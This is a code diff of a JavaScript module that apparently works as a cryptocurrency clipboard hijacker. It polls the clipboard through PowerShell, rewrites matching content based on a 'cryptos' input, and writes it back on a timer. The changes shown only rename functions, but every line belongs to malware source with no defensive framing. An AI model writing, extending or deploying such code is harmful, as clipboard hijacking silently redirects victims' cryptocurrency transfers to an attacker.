@@ -21,9 +21,9 @@ module.exports = (cryptos) => {
 
     let previousClipboardContent = '';
 
-    const checkClipboard = async () => {
+    const CheckClipboard = async () => {
         try {
-            const clipboardContent = await program.execPowerShell('Get-Clipboard');
+            const clipboardContent = await program.ExecPowerShell('Get-Clipboard');
             if (!clipboardContent || clipboardContent === previousClipboardContent) return;
 
             let updatedText = clipboardContent;
@@ -42,7 +42,7 @@ module.exports = (cryptos) => {
                 }
 
                 if (replaced) {
-                    await program.execPowerShell(`Set-Clipboard "${updatedText}"`);
+                    await program.ExecPowerShell(`Set-Clipboard "${updatedText}"`);
                     previousClipboardContent = updatedText;
                     break;
                 }
@@ -52,5 +52,5 @@ module.exports = (cryptos) => {
         }
     };
 
-    setInterval(checkClipboard, CHECK_INTERVAL);
+    setInterval(CheckClipboard, CHECK_INTERVAL);
 };
